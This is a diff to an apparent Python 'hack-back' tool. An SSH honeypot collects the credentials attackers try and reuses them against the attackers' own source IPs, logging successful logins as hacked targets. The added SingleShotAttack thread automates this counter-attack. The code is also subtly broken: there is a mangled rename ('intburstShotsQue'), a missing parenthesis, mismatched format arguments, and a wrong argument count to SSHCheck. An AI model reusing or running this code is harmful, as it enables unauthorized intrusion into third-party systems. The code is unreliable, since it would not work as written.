@@ -28,7 +28,8 @@ targetsInQ = 0
 hackedTargets = []
 
 listOfLogins = [] # login = (rate, ("login", "password"))
-queOfTargets = queue.Queue() #.put() .get()
+burstShotsQue = queue.Queue() #.put() .get()
+singleShotsQue =  queue.Queue()
 setOfCaptureTargets = {} # (target, captureTime)
 
 
@@ -51,8 +52,8 @@ def addTarget(target):
     global targetsInQ
     targetsInQ += 1
     debug("{} {}".format(inspect.currentframe().f_code.co_name, target))
-    queOfTargets.put(target)
-    setOfCaptureTargets[target] = int(time.time())
+    burstShotsQue.put(target)
+    setOfCaptureTargets[target] = intburstShotsQue(time.time())
     logger(honeypotLog, "new target   {}".format(target))
 
 def addLoginPair(login, password, rate):
@@ -75,6 +76,7 @@ def SSHLoginsCollector(source, client_socket):
                     break
             if(flag):
                 addLoginPair(username, password, 0)
+                singleShotsQue.put((source[0], username, password))
             return paramiko.AUTH_FAILED
         def get_allowed_auths(self, username):
             return 'password'
@@ -146,10 +148,20 @@ def SSHCheck(target, SSHport, user, password):
         ssh.close()
     return resultCode
 
-def SSHAttacker():
+def SingleShotAttack():
     while True:
-        # if(queOfTargets.empty)
-        target = queOfTargets.get()
+        target = singleShotsQue.get()
+        logger(attackLog, "singleshot   {} {} {}".format(target)
+        status = SSHCheck(target[0], target[1], target[2])
+        if(status == 0):
+            logger(attackLog, "PASSWORD FOUND   {} {} {}".format(target))
+            logger(hacked, "{} {} {}".format(target))
+            hackedTargets.append("{} {} {}".format(target))
+
+def BurstAttack():
+    while True:
+        # if(burstShotsQue.empty)
+        target = burstShotsQue.get()
         logger(attackLog, "starting attack   {}".format(target))
         global attackedTargets
         attackedTargets += 1
@@ -226,7 +238,7 @@ def infoMenu():
     for i in hackedTargets[-10:]:
         print(i)
     str = input(" ")
-    # print("queue: {}".format(queOfTargets.size()))
+    # print("queue: {}".format(burstShotsQue.size()))
 
 def mainMenu():
     os.chdir(logs)
@@ -264,7 +276,8 @@ def main():
     importLP(defLogins)
     Thread(target=SSHhoneypot, args=()).start()
     Thread(target=mainMenu, args=()).start()
-    Thread(target=SSHAttacker, args=()).start()
+    Thread(target=BurstAttack, args=()).start()
+    Thread(target=SingleShotAttack, args=()).start()
     while True:
         time.sleep(1800) # 30 minutes
         loginPairsCleaner()
